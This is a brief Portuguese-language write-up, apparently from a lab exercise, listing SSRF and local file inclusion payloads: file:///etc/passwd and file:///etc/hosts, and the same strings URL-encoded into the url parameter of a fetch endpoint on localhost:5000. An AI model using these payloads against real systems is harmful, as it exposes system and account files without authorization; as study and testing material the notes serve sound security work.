## para explorar a vulnerabilidade SSRF e LFI

Há várias formas, incluindo protocolos, tais como FTP, SMB, SMTP, etc

**Payloads utilizados 

Para a analise da vulnerabilidade utilizei os payloads abaixo:

### Leitura dos arquivos 

Digite o comando abaixo:

Cenário 1: 

file:///etc/passwd

Cenário 2: 

file:///etc/hosts


### Acessos aplicações internas

Digite o comando abaixo:

Cenário 1: 

http://localhost:5000/fetch?url=file%3A%2F%2F%2Fetc%2Fpasswd


Cenário 2: 

http://localhost:5000/fetch?url=file%3A%2F%2F%2Fetc%2Fhosts


        
